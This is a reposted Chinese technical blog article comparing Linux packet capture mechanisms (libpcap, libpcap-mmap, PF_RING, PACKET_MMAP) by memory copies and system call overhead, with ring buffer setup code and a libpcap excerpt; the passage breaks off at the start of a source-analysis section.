    <url>/2022/11/05/Linux%E7%BD%91%E7%BB%9C%E6%8A%A5%E6%96%87%E6%8D%95%E8%8E%B7-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#  Linux网络报文捕获/抓包技术对比：napi、libpcap、afpacket、PF_RING、PACKET_MMAP、DPDK、XDP<blockquote><p>转载，原文链接：<a href="https://blog.csdn.net/Rong_Toa/article/details/109275029">https://blog.csdn.net/Rong_Toa/article/details/109275029</a></p></blockquote><h2 id="1-传统linux网络协议栈流程和性能分析"><a href="#1-传统linux网络协议栈流程和性能分析" class="headerlink" title="1.传统linux网络协议栈流程和性能分析"></a>1.传统linux网络协议栈流程和性能分析</h2><p>​    Linux网络协议栈是处理网络数据包的典型系统，它包含了从物理层直到应用层的全过程。</p><p><img src="https://img-blog.csdnimg.cn/20201025161643899.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><ol><li>数据包到达网卡设备。</li><li>网卡设备依据配置进行DMA操作。（第1次拷贝：网卡寄存器-&gt;内核为网卡分配的缓冲区ring buffer）</li><li>网卡发送中断，唤醒处理器。</li><li>驱动软件从ring buffer中读取，填充内核skbuff结构（第2次拷贝：内核网卡缓冲区ring buffer-&gt;内核专用数据结构skbuff）</li><li>数据报文达到内核协议栈，进行高层处理。</li><li>socket系统调用将数据从内核搬移到用户态。(第3次拷贝：内核空间-&gt;用户空间)</li></ol><p><strong>研究者们发现，Linux内核协议栈在数据包的收发过程中，内存拷贝操作的时间开销占了整个处理过程时间开销的65%，此外层间传递的系统调用时间也占据了8%～10%。</strong></p><h2 id="协议栈的主要问题"><a href="#协议栈的主要问题" class="headerlink" title="协议栈的主要问题"></a>协议栈的主要问题</h2><h4 id="针对单个数据包级别的资源分配和释放"><a href="#针对单个数据包级别的资源分配和释放" class="headerlink" title="针对单个数据包级别的资源分配和释放"></a>针对单个数据包级别的资源分配和释放</h4><p>每当一个数据包到达网卡，系统就会分配一个分组描述符用于存储数据包的信息和头部，直到分组传送到用户态空间，其描述符才被释放。此外，sk_buff庞大的数据结构中的大部分信息对于大多数网络任务而言都是无用的.</p><h4 id="流量的串行访问"><a href="#流量的串行访问" class="headerlink" title="流量的串行访问"></a>流量的串行访问</h4><p>​    现代网卡包括多个硬件的接收端扩展(receiver-side scaling, RSS)队列可以将分组按照五元组散列函数分配到不同的接收队列。使用这种技术，分组的捕获过程可以被并行化，因为每个RSS队列可以映射到一个特定的CPU核，并且可以对应相应的NAPI线程。这样整个捕获过程就可以做到并行化。</p><p>但是问题出现在之上的层次，Linux中的协议栈在网络层和传输层需要分析合并的所有数据包</p><p>①所有流量在一个单一模块中被处理，产生性能瓶颈；<br>②用户进程不能够从一个单一的RSS队列接收消息.<br>     这就造成了上层应用无法利用现代硬件的并行化处理能力，这种在用户态分配流量先后序列的过程降低了系统的性能，丢失了驱动层面所获得的加速.</p><p>此外，从不同队列合并的流量可能会产生额外的乱序分组</p><h4 id="从驱动到用户态的数据拷贝"><a href="#从驱动到用户态的数据拷贝" class="headerlink" title="从驱动到用户态的数据拷贝"></a>从驱动到用户态的数据拷贝</h4><p>从网卡收到数据包到应用取走数据的过程中，存在至少2次数据包的复制</p><h4 id="内核到用户空间的上下文切换"><a href="#内核到用户空间的上下文切换" class="headerlink" title="内核到用户空间的上下文切换"></a>内核到用户空间的上下文切换</h4><p>从应用程序的视角来看，它需要执行系统调用来接收每个分组.每个系统调用包含一次从用户态到内核态的上下文切换，随之而来的是大量的CPU时间消耗.在每个数据包上执行系统调用时产生的上下文切换可能消耗近1 000个CPU周期.</p><h4 id="跨内存访问"><a href="#跨内存访问" class="headerlink" title="跨内存访问"></a>跨内存访问</h4><p>例如，当接收一个64 B分组时，cache未命中造成了额外13.8%的CPU周期的消耗.另外，在一个基于NUMA的系统中，内存访问的时间取决于访问的存储节点.因此，cache未命中在跨内存块访问环境下会产生更大的内存访问延迟，从而导致性能下降.</p><h2 id="2-提高捕获效率的技术"><a href="#2-提高捕获效率的技术" class="headerlink" title="2.提高捕获效率的技术"></a>2.提高捕获效率的技术</h2><p>目前高性能报文捕获引擎中常用的提高捕获效率的技术，这些技术能够克服之前架构的性能限制.</p><h3 id="预分配和重用内存资源"><a href="#预分配和重用内存资源" class="headerlink" title="预分配和重用内存资源"></a>预分配和重用内存资源</h3><p>这种技术包括：</p><ul><li>开始分组接收之前，预先分配好将要到达的数据包所需的内存空间用来存储数据和元数据(分组描述符)。尤其体现在，在加载网卡驱动程序时就分配好 N 个描述符队列(每个硬件队列和设备一个).</li><li>同样，当一个数据包被传送到用户空间，其对应的描述符也不会被释放，而是重新用于存储新到达的分组.得益于这一策略，在每个数据包分配&#x2F;释放所产生的性能瓶颈得到了消除.此外，也可以通过简化sk_buff的数据结构来减少内存开销.</li></ul><h3 id="数据包采用并行直接通道传递"><a href="#数据包采用并行直接通道传递" class="headerlink" title="数据包采用并行直接通道传递."></a>数据包采用并行直接通道传递.</h3><p>为了解决序列化的访问流量，需要建立从RSS队列到应用之间的直接并行数据通道.这种技术通过特定的RSS队列、特定的CPU核和应用三者的绑定来实现性能的提升.</p><p>这种技术也存在一些缺点:</p><ul><li>①数据包可能会乱序地到达用户态，从而影响某些应用的性能;</li><li>②RSS使用Hash函数在每个接收队列间分配流量.当不同核的数据包间没有相互关联时，它们可以被独立地分析，但如果同一条流的往返数据包被分配到不同的CPU核上时，就会造成低效的跨核访问.</li></ul><h3 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h3><p>使用这种方法，应用程序的内存区域可以映射到内核态的内存区域，应用能够在没有中间副本的情况下读写这片内存区域.<br>用这种方式我们可以使应用直接访问网卡的DMA内存区域，这种技术被称为零拷贝.但零拷贝也存在潜在的安全问题，向应用暴露出网卡环形队列和寄存器会影响系统的安全性和稳定性 .</p><h3 id="数据包的批处理"><a href="#数据包的批处理" class="headerlink" title="数据包的批处理"></a>数据包的批处理</h3><p>为了避免对每个数据包的重复操作的开销，可以使用对数据包的批量处理.</p><p>这个策略将数据包划分为组，按组分配缓冲区，将它们一起复制到内核&#x2F;用户内存.运用这种技术减少了系统调用以及随之而来的上下文切换的次数;同时也减少了拷贝的次数，从而减少了平摊到处理和复制每个数据包的开销.</p><p>但由于分组必须等到一个批次已满或定时器期满才会递交给上层，批处理技术的主要问题是延迟抖动以及接收报文时间戳误差的增加.</p><h3 id="亲和性与预取"><a href="#亲和性与预取" class="headerlink" title="亲和性与预取"></a>亲和性与预取</h3><p>由于程序运行的局部性原理，为进程分配的内存必须与正在执行它的处理器操作的内存块一致，这种技术被称为内存的亲和性.<br>CPU亲和性是一种技术，它允许进程或线程在指定的处理器核心上运行.</p><p>在内核与驱动层面，软件和硬件中断可以用同样的方法指定具体的CPU核或处理器来处理，称为中断亲和力.每当一个线程希望访问所接收的数据，如果先前这些数据已被分配到相同CPU核的中断处理程序接收，则它们在本地cache能够更容易被访问到.</p><h2 id="3-经典抓包引擎"><a href="#3-经典抓包引擎" class="headerlink" title="3.经典抓包引擎"></a>3.经典抓包引擎</h2><h3 id="3-1-libpcap"><a href="#3-1-libpcap" class="headerlink" title="3.1 libpcap"></a>3.1 libpcap</h3><p>参考：<a href="https://www.jianshu.com/p/ed6db49a3428">libpcap实现机制及接口函数</a></p><p>libpcap的包捕获机制是在数据链路层增加一个旁路处理，不干扰系统自身的网路协议栈的处理，对发送和接收的数据包通过Linux内核做过滤和缓冲处理，最后直接传递给上层应用程序。</p><p><img src="https://img-blog.csdnimg.cn/20201025161712705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><ol><li><p>数据包到达网卡设备。</p></li><li><p>网卡设备依据配置进行DMA操作。（第1次拷贝：网卡寄存器-&gt;内核为网卡分配的缓冲区ring buffer）</p></li><li><p>网卡发送中断，唤醒处理器。</p></li><li><p>驱动软件从ring buffer中读取，填充内核skbuff结构（第2次拷贝：内核网卡缓冲区ring buffer-&gt;内核专用数据结构skbuff）</p></li><li><p>接着调用netif_receive_skb函数：</p><p>如果有抓包程序，由网络分接口进入BPF过滤器，将规则匹配的报文拷贝到系统内核缓存 （第3次拷贝）。BPF为每一个要求服务的抓包程序关联一个filter和两个buffer。BPF分配buffer 且通常情况下它的额度是4KB the store buffer 被使用来接收来自适配器的数据； the hold buffer被使用来拷贝包到应用程序。</p></li><li><p>处理数据链路层的桥接功能；根据skb-&gt;protocol字段确定上层协议并提交给网络层处理，进入网络协议栈，进行高层处理。libpcap绕过了Linux内核收包流程中协议栈部分的处理，使得用户空间API可以直接调用套接字PF_PACKET从链路层驱动程序中获得数据报文的拷贝，将其从内核缓冲区拷贝至用户空间缓冲区（第4次拷贝）</p></li></ol><h3 id="3-2-libpcap-mmap"><a href="#3-2-libpcap-mmap" class="headerlink" title="3.2 libpcap-mmap"></a>3.2 libpcap-mmap</h3><p>libpcap-mmap是对旧的libpcap实现的改进，新版本的libpcap基本都采用packet_mmap机制（见3.4 PACKET_MMAP小节）。PACKET_MMAP通过mmap，减少一次内存拷贝（第4次拷贝没有了），减少了频繁的系统调用，大大提高了报文捕获的效率。</p><h3 id="3-3-PF-RING"><a href="#3-3-PF-RING" class="headerlink" title="3.3 PF_RING"></a>3.3 PF_RING</h3><p>参考：<a href="https://www.jianshu.com/p/6d3f3cdc2411">PF_RING学习笔记</a></p><p><strong>我们看到之前libpcap有4次内存拷贝。</strong></p><p><strong>libpcap_mmap有3次内存拷贝。</strong></p><p>PF_RING提出的核心解决方案便是减少报文在传输过程中的拷贝次数。</p><p><img src="https://img-blog.csdnimg.cn/20201025161730652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><p>可以看到，相对与libpcap_mmap来说，pfring允许用户空间内存直接和rx_buffer做mmap。这又减少了一次拷贝（libpcap_mmap的第2次拷贝：rx_buffer-&gt;skb）</p><p>PF-RING ZC实现了DNA（Direct NIC Access 直接网卡访问）技术，将用户内存空间映射到驱动的内存空间，使用户的应用可以直接访问网卡的寄存器和数据。</p><p>通过这样的方式，避免了在内核对数据包缓存，减少了一次拷贝（libpcap的第1次拷贝，DMA到内核缓冲区的拷贝）。这就是完全的零拷贝。</p><p><img src="https://img-blog.csdnimg.cn/20201025161745452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><p>其缺点是，只有一个应用可以在某个时间打开DMA ring（请注意，现在的网卡可以具有多个RX &#x2F; TX队列，从而就可以在每个队列上同时一个应用程序），换而言之，用户态的多个应用需要彼此沟通才能分发数据包。</p><p><a href="https://cloud.tencent.com/developer/article/1521276">https://cloud.tencent.com/developer/article/1521276</a></p><p><strong>PF_RING针对libpcap的改进方法</strong>：将网卡接收到的数据包存储在一个环状缓存中，这个<strong>环状缓存</strong>有两个接口，一个供网卡向其中写数据，另一个为应用层程序提供读取数据包的接口，从而减少了内存的拷贝次数，若将收到的数据包分发给多个环形缓冲区则可以实现多线程应用程序的读取。</p><p>每创建一个PF_RING套接字便分配一个环形缓冲区，当套接字结束时释放缓冲区，不同套接字拥有不同缓冲区，将PF_RING套接字绑定到某网卡上，当数据包到达网卡时，将其放入环形缓冲区，若缓冲区已满，则丢弃该数据包。当有新的数据包到达时，直接覆盖掉已经被用户空间读取过的数据包空间。</p><p>网卡接收到新的数据包后，直接写入环形缓冲区，以便应用程序直接读，若应用程序需要向外发送数据包，也可以直接将数据包写入环形缓冲区，以便网卡驱动程序将该数据包发送到相应接口上。</p><p><strong>PF_RING的工作流程：</strong></p><p>普通的网络接收函数中，网卡驱动到内核传递数据的核心是netif_rx()函数，若使用了设备轮询（NAPI）机制（中断机制+轮询机制，以中断方式通知系统，将设备注册到轮询队列后关闭中断，轮询队列中注册的网络设备从而读取数据包，采用NAPI机制可以减少中断触发的时间），则传递数据的核心是netif_receive_skb()函数。PF_RING定义了一个处理函数skb_ring_handler()，插入前两个核心函数的起始位置，每当有数据包需要传递时，先经过<strong>skb_ring_handler</strong>()的处理。</p><p><img src="https://img-blog.csdnimg.cn/20201025162643552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><p>（1） 一般的数据包捕获（libpcap）：</p><p><img src="https://img-blog.csdnimg.cn/20201025162703891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><p>(2)非零拷贝的pf_ring（pf_ring noZC）：</p><p><img src="https://img-blog.csdnimg.cn/20201025162721601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><p>(3)零拷贝的pf_ring（pf_ring ZC）：</p><p><img src="https://img-blog.csdnimg.cn/202010251627397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><p>PF_RING有三种工作模式：</p><p>Transparent_mode&#x3D;0：用户通过mmap获取已经拷贝到内核的数据包，相当于libpcap-mmap技术；<br>Transparent_mode&#x3D;1：将数据包放入环形缓冲区；<br>Transparent_mode&#x3D;2：<strong>数据包只由PF_RING模块处理，不经过内核，直接mmap到用户态</strong><br>后两种模式需要使用PF_RING特殊定制的网卡驱动：pf_ring.ko</p><blockquote><p>PF_RING部分内容分享自微信公众号 - nginx遇上redis（GGame_over_the_world）</p></blockquote><h3 id="3-4-PACKET-MMAP"><a href="#3-4-PACKET-MMAP" class="headerlink" title="3.4 PACKET_MMAP"></a>3.4 PACKET_MMAP</h3><blockquote><p><a href="https://blog.csdn.net/dandelionj/article/details/16980571">https://blog.csdn.net/dandelionj/article/details/16980571</a></p></blockquote><p>PACKET_MMAP实现的代码都在net&#x2F;packet&#x2F;af_packet.c中，其中一些宏、结构等定义在include&#x2F;linux&#x2F;if_packet.h中。</p><h4 id="PACKET-MMAP的实现原理"><a href="#PACKET-MMAP的实现原理" class="headerlink" title="PACKET_MMAP的实现原理"></a>PACKET_MMAP的实现原理</h4><p>PACKET_MMAP在内核空间中分配一块内核缓冲区，然后用户空间程序调用mmap映射到用户空间。将接收到的skb拷贝到那块内核缓冲区中，这样用户空间的程序就可以直接读到捕获的数据包了。</p><p>如果没有开启PACKET_MMAP，只是依靠AF_PACKET非常的低效。它有缓冲区的限制，并且每捕获一个报文就需要一个系统调用，如果为了获得packet的时间戳就需要两个系统调用了（获得时间戳还需要一个系统调用，libpcap就是这样做的）。</p><p>PACKET_MMAP非常高效，它提供一个映射到用户空间的大小可配置的环形缓冲区。这种方式，读取报文只需要等待报文就可以了，大部分情况下不需要系统调用（其实poll也是一次系统调用）。通过内核空间和用户空间共享的缓冲区还可以起到减少数据拷贝的作用。</p><p>当然为了提高捕获的性能，不仅仅只是PACKET_MMAP。如果你在捕获一个高速网络中的数据，你应该检查NIC是否支持一些中断负载缓和机制或者是NAPI，确定开启这些措施。</p><p>PACKET_MMAP减少了系统调用，不用recvmsg就可以读取到捕获的报文，相比原始套接字+recvfrom的方式，减少了一次拷贝和一次系统调用。</p><h4 id="PACKET-MMAP的使用"><a href="#PACKET-MMAP的使用" class="headerlink" title="PACKET_MMAP的使用"></a>PACKET_MMAP的使用</h4><p>从系统调用的角度来看待如何使用PACKET_MMAP，可以从 <a href="http://blog.chinaunix.net/u/12592/showart_2207614.html">libpcap底层实现变化的分析</a>中strace的中看出来：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`[setup]:`<br>`socket()   ------&gt; 捕获socket的创建`<br>`setsockopt()  ------&gt; 环形缓冲区的分配`<br>`mmap()   ------&gt; 将分配的缓冲区映射到用户空间中`<br>`[capture]`<br>`poll()   ------&gt; 等待新进的报文`<br>`[shutdown]`<br>`close   ------&gt; 销毁捕获socket和所有相关的资源`<br></code></pre></td></tr></table></figure><p>接下来的内容，翻译自<strong>Document&#x2F;networking&#x2F;packet_mmap.txt</strong>，但是根据需要有所删减</p><ol><li><strong>socket的创建和销毁如下，与不使用PACKET_MMAP是一样的:</strong></li></ol><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">int</span> fd = socket(PF_PACKET, <span class="hljs-built_in">mode</span>, htons(ETH_P_ALL))<br></code></pre></td></tr></table></figure><p>如果mode设置为SOCK_RAW，链路层信息也会被捕获；如果mode设置为SOCK_DGRAM，那么对应接口的链路层信息捕获就不会被支持，内核会提供一个虚假的头部。</p><p>销毁socket和释放相关的资源，可以直接调用一个简单的close()系统调用就可以了。</p><ol start="2"><li><strong>PACKET_MMAP的设置</strong></li></ol><p>用户空间设置PACKET_MMAP只需要下面的系统调用就可以了:</p><p>setsockopt(fd, SOL_PACKET, PACKET_RX_RING, (void *)&amp;req, sizeof(req));<br>上面系统调用中最重要的就是req参数，其定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tpacket_req</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    tp_block_size;  <span class="hljs-comment">/* Minimal size of contiguous block */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    tp_block_nr;    <span class="hljs-comment">/* Number of blocks */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    tp_frame_size;  <span class="hljs-comment">/* Size of frame */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    tp_frame_nr;    <span class="hljs-comment">/* Total number of frames */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这个结构被定义在include&#x2F;linux&#x2F;if_packet.h中，在捕获进程中建立一个不可交换(unswappable)内存的环形缓冲区。通过被映射的内存，捕获进程就可以无需系统调用就可以访问到捕获的报文和报文相关的元信息，像时间戳等。</p><p>捕获frame被划分为多个block，每个block是一块物理上连续的内存区域，有tp_block_size&#x2F;tp_frame_size个frame。block的总数是tp_block_nr。其实tp_frame_nr是多余的，因为我们可以计算出来：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">frames_per_block</span> = tp_block_size/tp_frame_size<br></code></pre></td></tr></table></figure><p>实际上，packet_set_ring检查下面的条件是否正确：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">frames_per_block * tp_block_nr <span class="hljs-operator">=</span><span class="hljs-operator">=</span> tp_frame_nr<br></code></pre></td></tr></table></figure><p>下面我们可以一个例子：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tp_block_size</span>= <span class="hljs-number">4096</span><br><span class="hljs-attr">tp_frame_size</span>= <span class="hljs-number">2048</span><br><span class="hljs-attr">tp_block_nr</span>  = <span class="hljs-number">4</span><br><span class="hljs-attr">tp_frame_nr</span>  = <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>得到的缓冲区结构应该如下：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">    block <span class="hljs-comment">#1                 block #2         </span><br>+<span class="hljs-params">---------</span>+<span class="hljs-params">---------</span>+    +<span class="hljs-params">---------</span>+<span class="hljs-params">---------</span>+    <br>| frame 1 | frame 2 |    | frame 3 | frame 4 |    <br>+<span class="hljs-params">---------</span>+<span class="hljs-params">---------</span>+    +<span class="hljs-params">---------</span>+<span class="hljs-params">---------</span>+    <br>    block <span class="hljs-comment">#3                 block #4</span><br>+<span class="hljs-params">---------</span>+<span class="hljs-params">---------</span>+    +<span class="hljs-params">---------</span>+<span class="hljs-params">---------</span>+<br>| frame 5 | frame 6 |    | frame 7 | frame 8 |<br>+<span class="hljs-params">---------</span>+<span class="hljs-params">---------</span>+    +<span class="hljs-params">---------</span>+<span class="hljs-params">---------</span>+<br></code></pre></td></tr></table></figure><p>每个frame必须放在一个block中，每个block保存整数个frame，也就是说一个frame不能跨越两个block。</p><ol start="3"><li><strong>映射和使用环形缓冲区</strong></li></ol><p>在用户空间映射缓冲区可以直接使用方便的mmap()函数。虽然那些buffer在内核中是由多个block组成的，但是映射后它们在用户空间中是连续的。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mmap</span>(<span class="hljs-number">0</span>, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>如果tp_frame_size能够整除tp_block_size，那么每个frame都将会是tp_frame_size长度；如果不是，那么tp_block_size&#x2F;tp_frame_size个frame之间就会有空隙，那是因为一个frame不会跨越两个block。</p><p>在每一个frame的开始有一个status域(可以查看struct tpacket_hdr)，这些status定义在include&#x2F;linux&#x2F;if_packet.h中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_STATUS_KERNEL   0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_STATUS_USER   1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_STATUS_COPY   2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_STATUS_LOSING   4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_STATUS_CSUMNOTREADY   8</span><br></code></pre></td></tr></table></figure><p>这里我们只关心前两个，TP_STATUS_KERNEL和TP_STATUS_USER。如果status为TP_STATUS_KERNEL，表示这个frame可以被kernel使用，实际上就是可以将存放捕获的数据存放在这个frame中；如果status为TP_STATUS_USER，表示这个frame可以被用户空间使用，实际上就是这个frame中存放的是捕获的数据，应该读出来。</p><p>内核将所有的frame的status初始化为TP_STATUS_KERNEL，当内核接受到一个报文的时候，就选一个frame，把报文放进去，然后更新它的状态为TP_STATUS_USER（这里假设不出现其他问题，也就是忽略其他的状态）。用户程序读取报文，一旦报文被读取，用户必须将frame对应的status设置为0，也就是设置为TP_STATUS_KERNEL，这样内核就可以再次使用这个frame了。</p><p>用户可以通过poll或者是其他机制来检测环形缓冲区中的新报文：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coq">struct pollfd pfd;<br><br>pfd.fd = fd;<br><br>pfd.revents = <span class="hljs-number">0</span>;<br>pfd.events = POLLIN|<span class="hljs-type">POLLRDNORM</span>|<span class="hljs-type">POLLERR</span>;<br><br><span class="hljs-keyword">if</span> (status == TP_STATUS_KERNEL)<br>    retval = poll(&amp;pfd, <span class="hljs-number">1</span>, <span class="hljs-built_in">timeout</span>);<br></code></pre></td></tr></table></figure><p>先检查状态值，然后再对frame进行轮循，这样就可以避免竞争条件了（如果status已经是TP_STATUS_USER了，也就是说在调用poll前已经有了一个报文到达。这个时候再调用poll，并且之后不再有新报文到达的话，那么之前的那个报文就无法读取了，这就是所谓的竞争条件）。</p><p>在libpcap-1.0.0中是这么设计的：</p><p>pcap-linux.c中的<strong>pcap_read_linux_mmap</strong>:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-comment">// 如果frame的状态在poll前已经为TP_STATUS_USER了，说明已经在poll前已经有一个数据包被捕获了，如果poll后不再有数据包被捕获，那么这个报文不会被处</span><br><br>理，这就是所谓的竞争情况。<br><br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">handle</span>-&gt;md.timeout &gt;= <span class="hljs-number">0</span>) &amp;&amp; !pcap_get_ring_frame(<span class="hljs-keyword">handle</span>, TP_STATUS_USER)) &#123;<br>    struct pollfd pollinfo;<br>    int ret;<br>    <br><br><br>pollinfo.fd = <span class="hljs-keyword">handle</span>-&gt;fd;<br>pollinfo.events = POLLIN;<br><br><span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-comment">/* poll() requires a negative timeout to wait forever */</span><br>    ret = poll(&amp;pollinfo, <span class="hljs-number">1</span>, (<span class="hljs-keyword">handle</span>-&gt;md.timeout &gt; <span class="hljs-number">0</span>)? <span class="hljs-keyword">handle</span>-&gt;md.timeout: <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> ((ret &lt; <span class="hljs-number">0</span>) &amp;&amp; (errno != EINTR)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">while</span> (ret &lt; <span class="hljs-number">0</span>);<br><br><br>&#125;<br><br><span class="hljs-comment">//依次处理捕获的报文</span><br><br><span class="hljs-keyword">while</span> ((pkts &lt; max_packets) || (max_packets &lt;= <span class="hljs-number">0</span>)) &#123; <br>    <span class="hljs-params">...</span><span class="hljs-params">...</span> <br>    <span class="hljs-comment">//如果frame的状态为TP_STATUS_USER就读出数据frame，否则就退出循环。</span><br>    <span class="hljs-comment">//注意这里是环形缓冲区</span><br>    h.raw = pcap_get_ring_frame(<span class="hljs-keyword">handle</span>, TP_STATUS_USER);<br>    <span class="hljs-keyword">if</span> (!h.raw)break; <br>    <span class="hljs-params">...</span><span class="hljs-params">...</span><br>    <span class="hljs-comment">/* pass the packet to the user */</span><br>    pkts++;<br>    callback(user, &amp;pcaphdr, bp);<br>    <span class="hljs-keyword">handle</span>-&gt;md.packets_read++;<br><span class="hljs-keyword">skip</span>:<br>    <span class="hljs-comment">/* next packet */</span><br>    switch (<span class="hljs-keyword">handle</span>-&gt;md.tp_version) &#123;<br>        <span class="hljs-keyword">case</span> TPACKET_V1:<br>            <span class="hljs-comment">//重新设置frame的状态为TP_STATUS_KERNEL </span><br>            h.h1-&gt;tp_status = TP_STATUS_KERNEL; <br>            break;<br>        <span class="hljs-params">...</span><span class="hljs-params">...</span> <br>    &#125;<br>&#125;<br><br> <br></code></pre></td></tr></table></figure><h4 id="PACKET-MMAP源码分析"><a href="#PACKET-MMAP源码分析" class="headerlink" 